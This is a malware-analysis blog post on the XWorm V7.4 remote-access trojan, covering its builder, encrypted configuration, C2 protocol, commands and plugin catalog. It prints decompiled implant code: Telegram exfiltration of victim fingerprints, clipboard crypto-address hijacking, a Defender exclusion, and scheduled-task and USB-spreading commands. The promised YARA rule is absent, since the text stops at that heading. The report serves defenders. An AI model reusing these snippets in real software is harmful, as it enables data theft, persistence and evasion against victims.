+++
title = "Xworm V7.4 analysis"
date = 2026-06-28
draft = false
tags = ["Xworm", "threat-intel", "cybercrime"]
summary = "This report documents the internals of the V7.4 builder of Xworm, and analyzes various samples compiled with all available flags in order to understand the implementation methods of the malware. A YARA detection rule and a MITRE ATT&CK technique mapping are provided."
+++

## Overview 
This report documents the internals of the V7.4 builder of Xworm, and its default-configuration sample: configuration storage, C2 protocol, command set, optional build-time capabilities, and the plugin (module) catalog, and concludes with a YARA detection rule and a MITRE ATT&CK technique mapping.

## 1. Disclaimer
**Malware analysis was performed entirely by a human**. The following **report was written by an AI** based on the notes taken during the analysis, and reviewed by the author.

## 2. Version History

| Version | Release Date | Notes |
|---|---|---|
| 7.0 | October 2025 | https://www.youtube.com/watch?v=thwO7ll3Xl4 |
| 7.1 | November 10, 2025 | https://www.youtube.com/watch?v=Jzq4MyqTatA |
| 7.2 | December 15, 2025 | https://www.youtube.com/watch?v=GBAh3_rPsZY |
| 7.3 | December 23, 2025 | https://www.youtube.com/watch?v=WR0tGlba9ps |
| 7.4 | ~January 14, 2026 | Version analyzed in this report |
| 7.5 | May 10, 2026 | https://www.youtube.com/watch?v=TRWbaIqo99g |

Version announcement screenshots from the V7 Telegram channel:

**7.1:**
![XWorm 7.1 announcement](3acbf075-5499-4be3-9aa9-d8cc0c0ffab4.png)

**7.2:**
![XWorm 7.2 announcement](6326121e-2b94-43f1-a4ad-c7656eb16aa2.png)

**7.3:**
![XWorm 7.3 announcement](8227658f-043c-459b-aaad-d16415cd542e.png)

**7.4:**
![XWorm 7.4 announcement](445d1d0b-0b3c-499b-8318-1fe3bbf75475.png)

**7.5:**
![XWorm 7.5 announcement](f5168c03-5290-4846-b003-4c1eab753f9e.png)

## 3. Builder Analysis

The builder package is distributed via the Ultimate-RAT-Collection repository. Its contents:

![Builder package contents](dcba0d2a-5afc-476f-a10e-127f914997ef.png)

The main builder interface:

![Builder main interface](6b64e3aa-b63e-4979-b850-e61e1128de8a.png)

The V7.4 builder retains the same three-tab layout seen in prior versions:

- **Connection** — C2 host(s)/port configuration

  ![Connection tab](ffa310f8-d3d0-4054-8669-9c6033fe8195.png)

- **Settings** — persistence, jitter, optional parameters (toggle switches)

  ![Settings tab](62eed209-baea-43ae-af18-62a6286f4864.png)

- **Build** — output executable generation, obfuscation selection

  ![Build tab](c6149a4d-7df7-46ee-8a72-c7542aa40d8a.png)

The builder also ships **extra tools**, including a standalone **Downloader** utility for staging secondary payloads:

![Downloader tool](10249881-b810-4603-869b-b8a349ba08fb.png)
![Downloader tool configuration](9082f58b-bf61-4d08-8c97-500337f76490.png)

## 4. Base Sample Analysis (Default Build — No Optional Features Enabled)

### 4.1 Configuration Storage & Encryption

Configuration values are stored Base64-encoded and AES-encrypted inside the binary:

![Encrypted configuration in the binary](c8fccc59-412f-45ed-94c8-2a51a28c0926.png)
![Encrypted configuration fields](ecc9b3e2-acf5-4a4d-bda3-3525cd9e77f1.png)

The decryption key is derived from MD5 of the configured **mutex** string, used as a 32-byte AES key in **ECB mode with no IV**:

```csharp
RijndaelManaged rijndaelManaged = new RijndaelManaged();
MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
byte[] array = new byte[32];
byte[] array2 = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.Mutex));
Array.Copy(array2, 0, array, 0, 16);
Array.Copy(array2, 0, array, 15, 16);
rijndaelManaged.Key = array;
rijndaelManaged.Mode = CipherMode.ECB;
ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
byte[] array3 = Convert.FromBase64String(input);
return Helper.BS(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
```

Note the key-expansion quirk: the 16-byte MD5 hash is copied into a 32-byte buffer twice, with the second copy starting at offset 15 (one byte short of a clean repeat) rather than offset 16 — an overlap that is consistent across the family and useful as a config-extraction fingerprint.

This same key-derivation/encryption scheme is reused for all **network traffic** (Section 4.6), not just the stored configuration.

### 4.2 Configuration Extraction (PowerShell)

The following script loads the implant assembly via reflection, pulls the `Settings` fields, and decrypts them using the routine above:

```powershell
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string]$ExecutablePath
)

Add-Type -AssemblyName System.Reflection
$assembly = [Reflection.Assembly]::LoadFile((Resolve-Path $ExecutablePath))

function Decrypt-AES {
    param (
        [string]$encryptedText
    )

    $rijndaelManaged = New-Object System.Security.Cryptography.RijndaelManaged
    $md5CryptoServiceProvider = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
    $array = New-Object byte[] 32
    $sourceArray = $md5CryptoServiceProvider.ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes($mutex)
    )

    [Array]::Copy($sourceArray, 0, $array, 0, 16)
    [Array]::Copy($sourceArray, 0, $array, 15, 16)

    $rijndaelManaged.Key = $array
    $rijndaelManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB

    $cryptoTransform = $rijndaelManaged.CreateDecryptor()
    $encryptedBytes = [System.Convert]::FromBase64String($encryptedText)
    $decryptedBytes = $cryptoTransform.TransformFinalBlock(
        $encryptedBytes, 0, $encryptedBytes.Length
    )

    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

$ExtracetedHost = $assembly.GetType('Settings').GetField('Hosts').GetValue($null)
$port           = $assembly.GetType('Settings').GetField('Port').GetValue($null)
$key            = $assembly.GetType('Settings').GetField('KEY').GetValue($null)
$spl            = $assembly.GetType('Settings').GetField('SPL').GetValue($null)
$sleep          = $assembly.GetType('Settings').GetField('Sleep').GetValue($null)
$groub          = $assembly.GetType('Settings').GetField('Groub').GetValue($null)
$usbnm          = $assembly.GetType('Settings').GetField('USBNM').GetValue($null)
$mutex          = $assembly.GetType('Settings').GetField('Mutex').GetValue($null)

$decryptedHosts = Decrypt-AES $ExtracetedHost
$decryptedPort  = Decrypt-AES $port
$decryptedKey   = Decrypt-AES $key
$decryptedSPL   = Decrypt-AES $spl
$decryptedGroub = Decrypt-AES $groub
$decryptedUSBNM = Decrypt-AES $usbnm

Write-Host "Hosts:  $decryptedHosts"
Write-Host "Port:   $decryptedPort"
Write-Host "KEY:    $decryptedKey"
Write-Host "SPL:    $decryptedSPL"
Write-Host "Groub:  $decryptedGroub"
Write-Host "USBNM:  $decryptedUSBNM"
```

### 4.3 Execution Flow — Main Threads

On startup, the implant spawns two persistent background threads.

**Thread 1 — Idle-time accounting:**

```csharp
for (;;)
{
    Thread.Sleep(1000);
    int lastInputTime = Helper.GetLastInputTime();
    if (Helper.LastLastIdletime > lastInputTime)
    {
        Helper.sumofidletime = Helper.sumofidletime.Add(TimeSpan.FromSeconds((double)Helper.LastLastIdletime));
    }
    else
    {
        Helper.Time = Conversions.ToString(Helper.GetLastInputTime());
    }
    Helper.LastLastIdletime = lastInputTime;
}
object obj;
return obj;
```

**Thread 2 — Connection watchdog:**

```csharp
for (;;)
{
    Thread.Sleep(new Random().Next(3000, 10000));
    if (!ClientSocket.isConnected)
    {
        ClientSocket.isDisconnected();
        ClientSocket.BeginConnect();
    }
    ClientSocket.allDone.WaitOne();
}
```

### 4.4 Command-and-Control Connection

C2 communication uses a raw TCP stream socket (`AF_INET`/`SOCK_STREAM`) rather than a standard application-layer protocol:

```csharp
public static object ConnectServer(string H)
{
    try
    {
        ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        ClientSocket.BufferLength = -1L;
        ClientSocket.Buffer = new byte[1];
        ClientSocket.MS = new MemoryStream();
        ClientSocket.S.ReceiveBufferSize = 51200;
        ClientSocket.S.SendBufferSize = 51200;
        ClientSocket.S.Connect(H, Conversions.ToInteger(Settings.Port));
        Settings.Host = H;
        ClientSocket.isConnected = true;
        ClientSocket.SendSync = RuntimeHelpers.GetObjectValue(new object());
        ClientSocket.Send(Conversions.ToString(ClientSocket.Info()));
        ClientSocket.ActivatePong = false;
        ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), null);
        TimerCallback timerCallback = delegate(object a0)
        {
            ClientSocket.Ping();
        };
        ClientSocket.Tick = new Timer(timerCallback, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
        ClientSocket.Speed = new Timer(new TimerCallback(ClientSocket.Pong), null, 1, 1);
    }
    catch (Exception ex)
    {
        ClientSocket.isConnected = false;
    }
    finally
    {
        ClientSocket.allDone.Set();
    }
    object obj;
    return obj;
}
```

A dedicated beaconing thread periodically transmits a `"PING!"` message with artificial jitter between `10000`–`15000` ms.

### 4.5 Device Fingerprinting

The first data sent upon connection is a device fingerprint (`INFO` record):

```csharp
public static object Info()
{
    ComputerInfo computerInfo = new ComputerInfo();
    return string.Concat(new object[]
    {
        "INFO",
        Settings.SPL,
        Helper.ID(),
        Settings.SPL,
        Environment.UserName,
        Settings.SPL,
        computerInfo.OSFullName.Replace("Microsoft", null),
        Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
        Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"),
        Settings.SPL,
        Settings.Groub,
        Settings.SPL,
        ClientSocket.INDATE(),
        Settings.SPL,
        ClientSocket.Spread(),
        Settings.SPL,
        ClientSocket.UAC(),
        Settings.SPL,
        Messages.Cam(),
        Settings.SPL,
        ClientSocket.CPU(),
        Settings.SPL,
        ClientSocket.GPU(),
        Settings.SPL,
        ClientSocket.RAM(),
        Settings.SPL,
        ClientSocket.Antivirus()
    });
}
```

Key data points collected:

- User name, OS full name, service pack, OS bitness (environment variables / `ComputerInfo`)
- Compile/build date, retrieved via `fileInfo.LastWriteTime.ToString("dd/MM/yyyy")` on the running executable
- Build-time parameters: XWorm group tag, USB-spreading configuration
- Administrator-privilege check
- Camera presence, via direct invocation of `GetDriverDescriptionA` in `avicap32.dll`
- CPU identifier, via WMI `Win32_Processor.DeviceID=CPU0`
- GPU, via WMI query `SELECT * FROM Win32_VideoController`
- Total RAM
- Installed antivirus product, via `ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct")`

### 4.6 Data Transmission Protocol

All outbound messages are AES-ECB encrypted (same key derivation as Section 4.1 — MD5 of the mutex, no IV), length-prefixed, and sent asynchronously:

```csharp
object sendSync = ClientSocket.SendSync;
ObjectFlowControl.CheckForSyncLockOnValueType(sendSync);
lock (sendSync)
{
    if (ClientSocket.isConnected)
    {
        try
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
                byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
                memoryStream.Write(array2, 0, array2.Length);
                memoryStream.Write(array, 0, array.Length);
                ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
                ClientSocket.S.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, new AsyncCallback(ClientSocket.EndSend), null);
            }
        }
        catch (Exception ex)
        {
            ClientSocket.isConnected = false;
        }
    }
}
```

Inbound traffic is handled by an asynchronous socket-receive callback that reassembles framed, encrypted messages and dispatches them to the command handler.

Selected operator-side C2 panel capabilities observed in the builder:

![C2 capability](949f0ef4-1ccf-49eb-b8fa-2317051bc318.png)
![C2 capability](0b6aabab-e46c-401d-8419-42f763e5f31c.png)
![C2 capability](91c88c81-481c-4029-bd1c-54cf7ea89053.png)
![C2 capability](107334d1-b1b9-4da3-8080-7fe4f5a68e48.png)
![C2 capability](b243590e-58be-4fa8-b592-48868e41016a.png)
![C2 capability](4b4eac4d-8845-4ee9-a70b-4e30b317caa1.png)

### 4.7 Command Set

| Command | Description | Key Behavior |
|---|---|---|
| `pong` | Echo reply | Sends back `"pong"` |
| `rec` | Implant restart | `Process.Start(startInfo);` |
| `CLOSE` | Implant shutdown | `Environment.Exit(0)` |
| `uninstall` | Removes persistence | Drops a temp `.bat` containing `DEL "(ExecutablePath)" /f /q` and `DEL "(TempScriptPath)" /f /q` |
| `update` | Writes a given file to the temp folder | |
| `DW` | Writes a PowerShell script to disk and executes it | `powershell.exe -ExecutionPolicy Bypass -File "(filepath)"` |
| `FM` | Runs an executable directly in memory | `entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), array);` |
| `LN` | Downloads a file from a URL to a temp path | `webClient.DownloadFile(array[2], text2);` |
| `Urlopen` | GET request to a URL | `Process.Start(Url);` |
| `Urlhide` | GET request to a URL | `httpWebRequest.GetResponse()` |
| `PCShutdown` | Shuts down host | `shutdown.exe /f /s /t 0` |
| `PCRestart` | Restarts host | `shutdown.exe /f /r /t 0` |
| `PCLogoff` | Logs out user | `shutdown.exe -L` |
| `RunShell` | Runs a command in a shell | `Interaction.Shell(command, AppWinStyle.Hide, false, -1)` |
| `StartDDos` | HTTP POST flood against given targets | New thread, randomized user agent (4.8), `Content-Length: 5235` |
| `StopDDos` | Stops the DDoS thread | |
| `StartReport` | Reports the foreground window/process to C2 | `Messages.SendMSG("Open [" + process.MainWindowTitle.ToLower() + "]");` |
| `StopReport` | Stops the reporting thread | |
| `Xchat` | Returns a device ID derived from environment values | `ClientSocket.Send("Xchat" + Settings.SPL + Helper.ID());` |
| `Hosts` | Returns contents of `\drivers\etc\hosts` plus host ID | |
| `Shosts` | Overwrites the hosts file with provided data | |
| `DDos` | Returns the literal string `"DDos"` | `ClientSocket.Send("DDos");` |
| `plugin` | Returns the list of installed plugins | |
| `savePlugin` | Installs a plugin on the implant | See Section 5 |
| `RemovePlugins` | Deletes all installed plugins | |
| `OfflineGet` | Retrieves offline keylogger data from `%temp%\Log.tmp` | |
| `$Cap` | Captures and returns a screenshot | `bitmap2.Save(memoryStream, ImageFormat.Jpeg);` |

Additional builder-exposed live C2 controls (process manager, file manager, remote shell, remote desktop, etc.) were also observed in the builder UI and correspond to the plugin catalog in Section 5.2.

### 4.8 User-Agent Strings (DDoS Module)

```csharp
public static string[] userAgents = new string[] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };
```

## 5. Plugin Architecture

Plugins are separate DLLs pushed via the `savePlugin` command and loaded into the implant at runtime.

### 5.1 Plugin Method Categories

Based on the exported/invoked method names observed across plugin DLLs, the following functional categories are inferred:

| Method | Likely Function |
|---|---|
| `Run` | Generic plugin startup |
| `RunRecovery` | Credential/data theft and recovery |
| `RunOptions` | Generic command execution interface |
| `injRun` | Process injection / RunPE functionality |
| `UACFunc` | UAC bypass / privilege escalation |
| `ENC` | File encryption (ransomware component) |
| `DEC` | File decryption (ransomware component) |

### 5.2 Plugin Catalog (Known Modules)

| DLL | Functionality | SHA-256 |
|---|---|---|
| `HelixPath.dll` | Create Telegram notifier | `87003A78CA138348791D561B0D32437D3FA9C931B57E8465C01FCEA5971C719E` |
| `DivineMesh.dll` | RunPE | `680EC3A3E7A90DFEDC1E572E25CC1A17A1782E882005D88E53DB9965136B81B1` |
| `LithiumLoop.dll` | Webcam live feed | `5C375193CA7074DF4255F3AB43C796F69FB5938F44BDDC0DBEEB6625F94C5C7D` |
| `StaticVoid.dll` | System sound live feed | `5CB62954BEE72039D191A39715BF887D0FDDBA1CED6058FD84C96873E7404F68` |
| `OxygenCloud.dll` | Bootkit | `66E18F8C94CC0938F99AD2A46494A331D3D0D5051F076DD75B81A429F8ACDE38` |
| `RadarScope.dll` | Rootkit | `85BEB16B7FCC71EFA6377B6494508AB4F52DD04135D07A5392C69A11479C2CCB` |
| `MarrowShift.dll` | File Manager | `16D6313CAAAB8D850895AF6E8033AAABE65498E99A2FAF3B49D2C084D7A34CE0` |
| `EtherNet.dll` | V20 Password Recovery | `351D24433567B9EA704C2E4A884807752AEE0EB513BF45DC7E0BC678A57C9F54` |
| `CosmosEdge.dll` | Registry Editor | `88B08E71E67F0F4610E96E667D4B7F331EA5AA5372F13FBCABBBBBB41FFDE73A` |
| `KryptonKey.dll` | Active Windows | `FFC87B460D490E218769C72B46724B73AB6ADD0BC46236E5649ACFCD46159C81` |
| `PyreTrace.dll` | TCP connections | `7629163AE38FB4392B1081A290030CEB67FEBDCAA8F7A5712B82D97A991C79D8` |
| `CrypticPulse.dll` | Persistence Manager | `000CFCCF2026B977748DC32E9C4AE8E5CB6E726ECF2554598AD44464E91CB6BE` |
| `VividSnap.dll` | Process Manager | `09032B654B6C0B3C2A1102239A895E6EA8CEB89A221AB15A3F117AC78D0E170C` |
| `AuraNode.dll` | Service Manager | `7BAFD173A30E599D670B91427B7D24795143F0D77C09DD6C9FCA13AF150A4C6F` |
| `NexusGrip.dll` | Clipboard Manager | `205CCC49D98DFDC9F730BBCF80B2860C5D9381C5ECA24B5DCB4A58F04B8FA4D7` |
| `PrimalVail.dll` | Installed Programs | `CCB3195374A9BE9636584C6805FA532CF9A9765A2B8E9539B0EB7A0B4AB4F553` |
| `MetricShell.dll` | Live VB.NET Compiler | `42E299741CAF374E3D5353DD4A6D199910C1BA5DBE5D65BF9225C80A4FA7DC0C` |
| `TalonVista.dll` | Location Manager | `A690C4AACA7A9D18E3C3FBE6064AEB53938A7FB2F9F6F34EEAFBCBCDD7826BC4` |
| `EonVault.dll` | "Pastime" — unnecessary features | `068008C26DD532A06E14394EC3A31917906C797582CA9D7C7BEDF41A12740B09` |
| `Vanguard.dll` | UAC Bypass | `B59E1BE553220C92D51BA2BC6F995FAA10232DAEF5DFA60DF52E41AFEAFAA922` |
| `FalconScope.dll` | Voice Chat | `89DD2E64DCEC3143D5DC4674B05C3FC91FE16AE62569396994F9C402160B7249` |
| `TitanFind.dll` | Computer performance window | `830DA300A32CDA26F6E930876EE45815818A08FDE80EB0915F923F8941B81505` |
| `SectorNine.dll` | Live keylogger | `37A38D220BD483B47014A21CF409A620471AD34BF287D31C465B28E42AB9CFCF` |
| `ImpactWave.dll` | Live chat | `587ABDD08CB32E5C1780CED38A799AB50ADD04882FDE7F7E32292406C79A8CB4` |
| `NordicPeak.dll` | File Searcher | `9CDA1851BAE66258401866077C9BD6D8BCE9ABD9154372B59FED599AB8E5897B` |
| `VectorFlow.dll` | RE-Run as Administrator | `3935AE2D95DCB3882ED3DEA9608CB6D911E583FBBA631B505FEFB3EF2653400A` |
| `GraveMantle.dll` | MessageBox | `BA4AA361A80C4EA88F267D3EECDE64DAF69CE6F202838FED6CE36F656B4541E0` |
| `PhantomArch.dll` | Ransomware | `47EB4560884156BDBE539C4B2852E31149DEC39A425920EEE899C361EF1C246C` |
| `FissionGate.dll` | Reverse Proxy | `B811703326822407E49EA0C1151E962470E8DC5BD23FE19C61F3200A794CF998` |
| `HydraWire.dll` | Hidden Browser | `DA5495A72A8E014E4776F1AA3EFE1628A687BB4AEDA3D1C5C6BFCFA71CBA6712` |
| `PentaCode.dll` | HiddenVNC (RunPE) | `9C8216A20197CC365E90089AE9DCBB8F8448CA8887409CA1B89DD7D221479FA1` |
| `JadeOrbit.dll` | HiddenVNC (Memory) | `F38415DB4E35F47611F8266A1B753C712ECD64B2F54E1CF29F7A9A61BFCF644F` |
| `PlasmaJet.dll` | HiddenVNC (Memory, Google Login) | `A59B0165A57709D24CF481D15984006929F8601B7AC774A2B5AC140F5E5ACE73` |
| `UnityAxis.dll` | Hidden Apps | `356593E85350876C5E661DAB2BCBF05836D316902CF4A866EFFB06539EEA04E7` |
| `VortexLoop.dll` | Botkiller | `8F0BDCD1B977B8E1FF1A76B9E2730E055BDE8A42DCA805EE4CA394B3F644D867` |
| `ApexLogic.dll` | Windows Update (lure/fake UI) | `3B2630E3433DD2D50DF05F6743F8C5BF4BE0AAAEFD0B7E1CD2CAE92CBF024830` |
| `BerylSync.dll` | Remote Desktop | `2A01B2D43C5CBA2B14FEC1E59F1651AA30FEBC558E5B23E2C9D99DF2E9F53E7F` |
| `CinderFlow.dll` | Chromium Recovery | `F370CC92D6E2CCBC519FF560030D3F14183F3A3D6904D2200BFC592D52B8149B` |
| `CipherLink.dll` | Password Recovery (related) | `9A71EA7367B53600B8579599D762766849E1E6750A2F05C8AB2030D6CDF78B30` |
| `DaggerPoint.dll` | Information gathering | `5EC512B958E6884D4586E331D13EAEC6FC64BCA53886F89340B8EDFE8B37E26D` |
| `FeralCore.dll` | Steam Recovery | `5B95C28895CAA93432B74252CDEDDB35F687A19F85B52613FB617ADA2E847717` |
| `NeonDrift.dll` | Unknown | `EE0CBE0C92D40AD0C66EA044B2A38A186B61D0750562F6D9E48C5931E80B50D6` |
| `OrbitSift.dll` | Shell | `AFE528A38EAC589F13F26D1F350F7C87595E1BAF02C4D6B2E2A5E908BC0EF174` |
| `RuneMark.dll` | Stealer | `DA1061C91058558D1817876E49986E3681BA48E3EBB7146B4DE48E11A088FC50` |
| `SaberPoint.dll` | Stealer | `DA1061C91058558D1817876E49986E3681BA48E3EBB7146B4DE48E11A088FC50` |
| `SilverGlow.dll` | Chat | `16A2798E1531F10ACC2518A498E25F1110B0A30688522D8E948F5298B3AD5D9E` |
| `SolarSpire.dll` | Recovery | `18573362A15BD14BA7194FFAE8DBF7A2DB5755FDF7C5DA43F6EAE3F9321C9F6B` |
| `StellarLift.dll` | RunPE | `680EC3A3E7A90DFEDC1E572E25CC1A17A1782E882005D88E53DB9965136B81B1` |
| `XenonTrack.dll` | Voice Chat | `89DD2E64DCEC3143D5DC4674B05C3FC91FE16AE62569396994F9C402160B7249` |
| `ZenithPixel.dll` | Microphone | `483B849150E3E62B70FFF928608EE870501D5DB6ADD115E0F941983187710296` |

> Note: several entries share identical hashes (`DivineMesh.dll`/`StellarLift.dll`; `RuneMark.dll`/`SaberPoint.dll`; `FalconScope.dll`/`XenonTrack.dll`) — these are renamed/repackaged copies of the same binary, likely renamed per-customer or per-campaign.

## 6. Optional Build Capabilities

### 6.1 AntiKill — Critical Process Protection

If enabled, a `ProcessCritical` class is added to the build. When the implant runs with administrator privileges, it marks itself as a critical system process via a direct call to `RtlSetProcessIsCritical` in `ntdll.dll`, preventing the process from being terminated (a crash of the process would BSOD the host):

```csharp
[DllImport("NTdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
public static extern void SetCurrentProcessIsCritical([MarshalAs(UnmanagedType.Bool)] bool isCritical, [MarshalAs(UnmanagedType.Bool)] ref bool refWasCritical, [MarshalAs(UnmanagedType.Bool)] bool needSystemCriticalBreaks);
```

### 6.2 TBotNotify — Telegram Exfiltration Channel

Sends an infection notification to an attacker-controlled Telegram bot, immediately after configuration is loaded:

![TBotNotify build option](beb2bd58-c07d-4aad-8bd7-343d314a2082.png)

```csharp
webClient.DownloadString(string.Concat(new string[]
{
    "https://api.telegram.org/bot",
    Settings.Token,
    "/sendMessage?chat_id=",
    Settings.ChatID,
    "&text=",
    text
}));
```

The `text` parameter contains the full device fingerprint: Client ID, username, OS info, CPU/GPU/RAM configuration, and XWorm group tag.

### 6.3 Clipper — Cryptocurrency Address Hijacking

A dedicated thread monitors the clipboard for content matching cryptocurrency-address regexes and silently swaps in an attacker-controlled address:

![Clipper build option](f164e261-08f5-46fa-bdbe-fef99ba5de93.png)

```csharp
new Thread(delegate
{
    Clipper.Run();
}).Start();
```

```csharp
if (this.RegexResult(Clipper.BTCRegex) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(Settings.BTC))
{
    object obj = Clipper.BTCRegex.Replace(ClipboardNotification.NotificationForm.currentClipboard, Settings.BTC);
    ClipboardFunc.SetText(Conversions.ToString(obj));
    Messages.SendMSG(Conversions.ToString(Operators.ConcatenateObject("BTC Clipper " + ClipboardNotification.NotificationForm.currentClipboard + " : ", obj)));
}
```

### 6.4 WDEX — Windows Defender Exclusion

If the implant is running with administrator privileges, it silently adds itself (path and process) to the Windows Defender exclusion list via PowerShell:

```csharp
if (Conversions.ToBoolean(ClientSocket.UAC()))
{
    try
    {
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        processStartInfo.FileName = "powershell.exe";
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" + Helper.current + "'";
        Process.Start(processStartInfo).WaitForExit();
        processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Process.GetCurrentProcess().MainModule.ModuleName + "'";
        Process.Start(processStartInfo).WaitForExit();
    }
    catch (Exception ex)
    {
    }
}
```

The `UAC()` check ensures the exclusion calls are only attempted when the process holds the elevation required for them to succeed.

### 6.5 Keylogger

When enabled, a keylogger runs in a dedicated thread, hooking keystrokes and logging them to a hardcoded temporary file. The path cannot be changed:

```csharp
public static string LoggerPath = Interaction.Environ("temp") + "\\Log.tmp";
```

Captured data is retrieved by the operator via the `OfflineGet` command (Section 4.7).

### 6.6 AntiAnalysis — Sandbox / Debugger Evasion

If enabled, the implant refuses to run inside analysis environments. The following checks are performed:

- **AnyRun:** queries `http://ip-api.com/line/?fields=hosting` and evaluates whether the response is `True` (hosting/datacenter IP indicative of a sandbox).
- **IsXP:** fails if the OS full name contains `xp` (Windows XP environment).
- **DetectManufacturer:** runs WMI query `SELECT * FROM Win32_ComputerSystem`; fails if the result contains `VIRTUAL`, `vmware`, or `VirtualBox`.
- **DetectDebugger:** direct call to `CheckRemoteDebuggerPresent` in `kernel32.dll`.
- **DetectSandboxie:** fails if the process has a handle to `SbieDll.dll`.

### 6.7 Persistence

Three persistence mechanisms can be configured:

- **Startup folder** — a `.lnk` shortcut pointing to the configured install folder/name is dropped into the user's Startup folder.
- **Scheduled Task** — created via:
  ```
  schtasks.exe /create /f /RL HIGHEST /sc minute /mo 1 /tn "(executable name)" /tr "(executable path)"
  ```
  `/RL HIGHEST` is only applied when the implant runs with administrative privileges.
- **Registry Run key** — a value is written to `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` pointing to the configured install folder/name.

### 6.8 USB Spreading

When enabled, a dedicated thread replicates the implant to removable drives:

- Sets `ShowSuperHidden` in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced` to `0`.
- Copies the executable to the root of the USB drive.
- Creates a shortcut that runs:
  ```
  cmd.exe /c start (executable name) &start (executable folder path)& exit
  ```
- Sets the LNK file's icon to the machine's default icon to disguise the lure.

### 6.9 Obfuscation

V7 introduces a second obfuscation option alongside the legacy one. Approximate output sizes: base executable ~35 KB, legacy obfuscator ~49 KB, new obfuscator ~85 KB.

**Legacy obfuscator (name obfuscation):** replaces all class and method names with random 68-character strings. The control flow is unchanged. Example of the main routine that spawns the two threads:

```csharp
Thread thread = new Thread(new ThreadStart(namOUTabdHQy1ozQ4suJEJbJZCfH4LWx5mgE97YFcE1wNN5GnHP0WiKfINC1plFBEyfo.WNluHjUUds5foWLFzH4a8zC1iBF7rYXcFvN7eGR6MUDsbN87ma29VnbXMRDC8onvXNoG));
Thread thread2 = new Thread(new ThreadStart(namOUTabdHQy1ozQ4suJEJbJZCfH4LWx5mgE97YFcE1wNN5GnHP0WiKfINC1plFBEyfo.vUS5zOXnsaEUCQ26VZaFveizTtWS9UMkszWkOtMxSeOkRQ1VUqYt06tocN0kjKzP7VQZ));
thread.Start();
thread2.Start();
thread2.Join();
```

This is trivially defeated by an analyst.

**New obfuscator (control-flow + non-ASCII naming):** intended to stack on top of the legacy one (it does not rename classes/methods). It introduces two key changes:

1. Most logic is wrapped in an infinite `for` loop driven by a state-machine `switch`, applied to every function, which complicates debugging. Example of the same main routine:

```csharp
_Thread thread;
_Thread thread2;
for (;;)
{
    switch (num2)
    {
    default:
        num2 = (Ⴗ.Ⴓ() ? 5 : 1);
        continue;
    case 1:
    case 3:
        Environment.Exit(0);
        goto IL_0164;
    case 2:
        break;
    case 4:
    case 5:
        goto IL_0164;
    case 6:
        goto IL_0192;
    }
    IL_018D:
    num2 = 6;
    continue;
    IL_0164:
    Ⴗ.Ⴗ();
    thread = new Thread(new ThreadStart(Main._Lambda$__1));
    thread2 = new Thread(new ThreadStart(Main._Lambda$__2));
    goto IL_018D;
}
```

2. A new class with function/field names composed entirely of special non-ASCII (Georgian script) characters is created. Most key routines are relocated into this class, and intertwined cross-calls make both static and dynamic analysis significantly harder. Example of the obfuscated encryption function:

```csharp
public static byte[] ႥႥ(byte[] A_0)
{
    Rijndael rijndael = new RijndaelManaged();
    MD5 md = new MD5CryptoServiceProvider();
    object obj;
    try
    {
        int num = 2;
        IDisposable disposable;
        for (;;)
        {
            switch (num)
            {
            case 0:
                Uninstaller.ႭႭ<SymmetricAlgorithm>((RijndaelManaged)rijndael, CipherMode.ECB, 529, 'Ȗ');
                disposable = Uninstaller.ႭႷ<SymmetricAlgorithm>(rijndael as RijndaelManaged, 188, 251);
                num = 4;
                break;
            case 1:
            case 5:
                goto IL_00EA;
            default:
                MyComputer.ႥႷ<SymmetricAlgorithm>(rijndael as RijndaelManaged, MyComputer.ႥႭ<HashAlgorithm>(md as MD5CryptoServiceProvider, global::Ⴃ.Ⴗ.Ⴃ(Settings.KEY), 327, 341), 'ʑ', 672);
                num = 0;
                break;
            case 3:
            case 4:
                goto IL_00CC;
            case 7:
                goto IL_00EC;
            }
        }
        IL_00CC:
        obj = ((ICryptoTransform)disposable).TransformFinalBlock(A_0 as byte[], 0, ((byte[])A_0).Length);
        IL_00EA:
        IL_00EC:;
    }
    catch (Exception ex)
    {
    }
    switch (2)
    {
    default:
        return obj as byte[];
    }
}
```

## 7. Detection

### 7.1 YARA Rule

The following rule was built from features common to multiple basic and obfuscated V7.4 samples compiled during analysis:

